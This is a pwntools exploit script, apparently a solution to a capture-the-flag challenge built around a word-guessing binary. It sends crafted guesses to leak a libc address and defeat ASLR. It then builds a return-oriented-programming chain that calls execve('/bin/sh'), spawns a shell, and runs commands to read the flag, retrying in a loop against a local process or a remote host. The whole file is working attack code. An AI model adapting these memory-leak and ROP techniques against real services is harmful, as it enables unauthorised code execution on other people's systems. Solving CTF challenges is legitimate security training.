from pwn import *

e = ELF("./challenge_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2")
context.binary = e

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

def get_one_gadgets():
    args = ["one_gadget", "-l", "100", "-r", libc.path]
    return [int(offset) + libc.address for offset in subprocess.check_output(args).decode('ascii').strip().split()]

def get_con():
    if not args.LOCAL:
        #p = remote('', 31337)
        p = remote(HOST, PORT)
    else:
        if args.GDB:
            p = gdb.debug([e.path], '''
            # ---< Your gdb script here >---
            continue
            ''', aslr=False)
        else:
            p = process([e.path])
    return p

# Good luck, you've got this!

def lmao(p):
    p.sendlineafter(b"How long will the solution word be?", b"10")
    p.sendlineafter(b"?", b"3")
    guess = b"\xff"*10
    p.sendlineafter(b"guess", guess)

    import random

    payload = b"/home/user/."*12
    payload += b"\x0f"*4
    # payload =
    payload  = random.randbytes(0x100)
    payload = bytes.fromhex("6d66caec4d2ff9ebb0e36714efc0745b9b03f0fb1a137c638a4469f63081f05a2f15af1cec12176a513f88e3d514658940626924ec9fa5f316fd262bcbcba96c1fda85823f60476df41cf5e1d7243e43c175afb6045c1e9e986d77ab0e6bbc81d4a38541069454dadf7c8c42e18918dba089bd7c290848e01486e80922f957e46e1f29e4716b73e1b9c7d3a5837446b16bcb4764b1c06541258a323b557dd776fafcfdda144e515a58b82f952f0c0d2525ff74013c4e1820420ad5981eb39dd40c400793300bdb144c474590ae8e1c78fce045d0569fdece02a8ca5edd0700f8c4f7d047ac0c702cd61cb0108a718d010409a1007b78196ad1c21266a4da5b5c")
    # print(payload.hex())
    p.sendlineafter(b"guess", payload)

    leaks = p.recvuntil(b"guess").replace(b"\x1b[0m", b"").replace(b"\x1b[1;30;43m", b"").replace(b"x1b[1;30;42m", b"").replace(b"  ", b"").replace(b" \x1b[1;30;42m ", b"")

    libc_addr = leaks[0x9f:0x9f+8]
    libc_addr = u64(libc_addr)
    print("libc addr", hex(libc_addr))
    libc.address = libc_addr - 0x29d90
    print("libc base " + hex(libc.address))

    #print(hexdump(leaks))
    #print(leaks)

    # payload  = random.randbytes(0x18)
    # payload = bytes.fromhex("97 7b 7a 41  cd b2 ec 17  77 34 c7 67  05 e1 d4 85 b4 ac bf 7c  3e 05 c2 f2")
    # payload += cyclic(0x200)


    # 0x000abc5c: mov rax, r11; ret;

    # 0x0009b55c: rol bl, 0x66; nop; mov eax, 0x16; ret;
    wtf = libc.address + 0x0009b55c

    rop = ROP(libc)
    rop.execve(next(libc.search(b"/bin/sh\x00")), 0, 0)

    payload = b""
    payload += p64(wtf)[1:]
    payload += rop.chain()
    # payload += b"i"*8
    payload += cyclic(0x200)
    p.sendlineafter(b"?", payload)

    #p.sendlineafter(b"File name too long", b"./submitter", timeout=1)
    time.sleep(2)
    p.sendline(b"id")
    p.recvuntil(b"=")
    p.sendline(b"./submitter")
    print(p.recvuntil(b"}", timeout=1))
    return True

while True:
    context.log_level = "error"
    p = get_con()
    context.log_level = "info"
    try:
        if lmao(p):
            p.close()
            break
    except EOFError:
        p.close()
        pass
print("bye")


